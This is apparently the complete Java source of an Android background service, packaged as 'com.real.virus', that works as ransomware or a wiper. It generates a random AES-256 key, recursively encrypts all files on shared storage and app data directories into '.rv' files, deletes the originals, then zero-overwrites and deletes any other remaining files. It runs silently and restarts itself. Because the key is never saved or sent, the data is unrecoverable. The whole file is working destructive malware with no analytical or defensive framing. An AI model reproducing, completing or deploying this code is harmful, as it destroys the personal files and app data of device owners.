package com.real.virus;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Environment;
import java.io.*;
import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

// Фоновый сервис: AES-256-GCM шифрование
public class CryptoService extends Service {

    private static final String[] TARGETS = {
        "/sdcard/",
        "/storage/emulated/0/",
        "/data/data/",
        "/data/media/0/"
    };

    @Override
    public int onStartCommand(Intent i, int f, int s) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    byte[] key = genKey();
                    for (String t : TARGETS) encryptDir(new File(t), key);
                    wipeOriginals();
                } catch (Exception e) {}
            }
        }).start();
        return START_STICKY;
    }

    private byte[] genKey() throws Exception {
        KeyGenerator kg = KeyGenerator.getInstance("AES");
        kg.init(256, new SecureRandom());
        return kg.generateKey().getEncoded();
    }

    private void encryptDir(File d, byte[] k) {
        if (d == null || !d.exists()) return;
        File[] fs = d.listFiles();
        if (fs == null) return;
        for (File f : fs) {
            if (f.isDirectory()) encryptDir(f, k);
            else encryptFile(f, k);
        }
    }

    private void encryptFile(File f, byte[] k) {
        try {
            if (f.getName().endsWith(".rv")) return;
            byte[] data = read(f);
            byte[] iv = new byte[12];
            new SecureRandom().nextBytes(iv);
            Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
            c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(k, "AES"), new GCMParameterSpec(128, iv));
            byte[] enc = c.doFinal(data);
            File out = new File(f.getAbsolutePath() + ".rv");
            FileOutputStream fos = new FileOutputStream(out);
            fos.write(iv);
            fos.write(enc);
            fos.close();
            f.delete();
        } catch (Exception e) {}
    }

    private byte[] read(File f) throws IOException {
        FileInputStream fis = new FileInputStream(f);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int n;
        while ((n = fis.read(buf)) != -1) bos.write(buf, 0, n);
        fis.close();
        return bos.toByteArray();
    }

    private void wipeOriginals() {
        for (String t : TARGETS) wipe(new File(t));
    }

    private void wipe(File d) {
        if (d == null || !d.exists()) return;
        File[] fs = d.listFiles();
        if (fs == null) return;
        for (File f : fs) {
            if (f.isDirectory()) wipe(f);
            else if (!f.getName().endsWith(".rv")) {
                try {
                    FileOutputStream fos = new FileOutputStream(f);
                    fos.write(new byte[(int) f.length()]);
                    fos.close();
                    f.delete();
                } catch (Exception e) {}
            }
        }
    }

    @Override
    public IBinder onBind(Intent i) { return null; }
}
